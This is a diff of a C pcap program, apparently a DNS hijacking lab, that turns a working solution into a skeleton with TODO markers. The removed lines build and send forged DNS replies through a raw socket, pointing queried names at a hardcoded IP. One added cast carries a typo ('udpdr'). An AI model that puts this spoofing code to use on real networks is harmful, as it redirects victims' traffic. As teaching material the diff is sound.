@@ -14,6 +14,11 @@
 #include<netinet/in.h>
 #include<arpa/inet.h>
 #include<pcap.h>
+
+#include "header.h"
+
+
+
 #include "dns_hijack.h"
 #include "header.h"
 #include "dns.h"
@@ -21,12 +26,6 @@
 //some global counter
 int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;
 
-int name_size(char* dns_name){
-	int i=0;
-	while(dns_name[i]!='0') i++;
-	i++;
-	return i;
-}
 
 int main(int argc, char *argv[])
 {
@@ -163,6 +162,7 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 	printf("a packet is received! %d \n", total++);
 	int size = header->len;
 
+	//	print_udp_packet(buffer, size);
 
 //	PrintData(buffer, size);
 
@@ -202,86 +202,40 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 	bzero(addit, ANS_SIZE*sizeof(res_record));
 
 	//the UDP header
-	struct udphdr *in_udphdr = (struct udphdr*)(in_iphr +1);//(((unsigned int)(in_iphr->ihl))*4));
-	print_udp_header((u_char*)in_udphdr, size);
+	struct udphdr *in_udphdr = (struct udpdr*)(in_iphr + 1);
+
 	//the DNS header
 	//	dns_header *dnsh = (dns_header*)(udph + 1);
-	uint8_t *dns_buff = (uint8_t*)(in_udphdr + 1);//sizeof(udphdr));
+	uint8_t *dns_buff = (uint8_t*)(in_udphdr + 1);
 
 	//	parse the dns query
 	int id = parse_dns_query(dns_buff, queries, answers, auth, addit);
-	if((ntohs(((dns_header* )dns_buff)->qd_count)!=1)) return;
-	printf("passed dns check\n");
+
+
 	/******************now build the reply using raw IP ************/
 	uint8_t send_buf[BUF_SIZE]; //sending buffer
 	bzero(send_buf, BUF_SIZE);
 
+
 	/**********dns header*************/
-	printf("here\n");
-
 	dns_header *dnshdr = (dns_header*)(send_buf + sizeof(struct iphdr) + sizeof(struct udphdr));
-	int dns_size=sizeof(dns_header)+name_size(queries[0].qname)+14;
-    build_dns_header(dnshdr,id,1,0,1,0,0);
-	printf("here\n");
-	res_record* rrf =(res_record*)(dnshdr+1);
-		printf("here\n");
+	int dns_size = 0;
+    //TODO
 
-	r_element* answer=rrf->element;
-	printf("here2");
-	answer->type=htons(TYPE_A);
-    answer->rdlength=htons(4);
-    answer->ttl=htonl(1000);
-    answer->_class=htons(CLASS_IN);
-	rrf->name=queries[0].qname;
-	printf("here3");
-	inet_pton(AF_INET,"129.104.96.100",rrf->rdata);
-
-	printf("past dns\n");
 
 	/****************UDP header********************/
 	struct udphdr *out_udphdr = (struct udphdr*)(send_buf + sizeof(struct iphdr));
     
-    out_udphdr->source=in_udphdr->dest;
-	out_udphdr->dest=in_udphdr->source;
-	out_udphdr->len=htons(8+dns_size);
-	out_udphdr->check=0;
+    //TODO
 
 	/*****************IP header************************/
-	struct iphdr *iph = (struct iphdr*)send_buf;
+	struct iphdr *out_iphdr = (struct iphdr*)send_buf;
 
-    iph->version=4;
-	iph->tos=0;
-	iph->ihl=5;
-	iph->tot_len=htons(sizeof (struct iphdr) + sizeof (struct udphdr) + dns_size);
-	iph->id=htons(1);    
-	iph->frag_off= htons(0);
-	iph->ttl=100;
-	iph->protocol=IPPROTO_UDP;
-	iph->saddr=in_iphr->daddr;
-    iph->daddr=in_iphr->saddr;
-	iph->check=htons(checksum((char*) iph,iph->tot_len));
-	
+    //TODO
 
 	/************** send out using raw IP socket************/
-	printf("to the end\n");
 
-    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-
-    int hincl = 1;                  /* 1 = on, 0 = off */
-    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
-
-	if(fd < 0)
-	{
-		perror("Error creating raw socket ");
-		exit(1);
-	}
-	struct sockaddr_in to;
-	to.sin_addr.s_addr=in_iphr->saddr;
-	to.sin_family=htons(AF_INET);
-	to.sin_port=in_udphdr->source;
-	sendto(fd,send_buf,ntohs(iph->tot_len),0,&to,sizeof(to));
-	perror("");
-
+    //TODO
 
 }
 
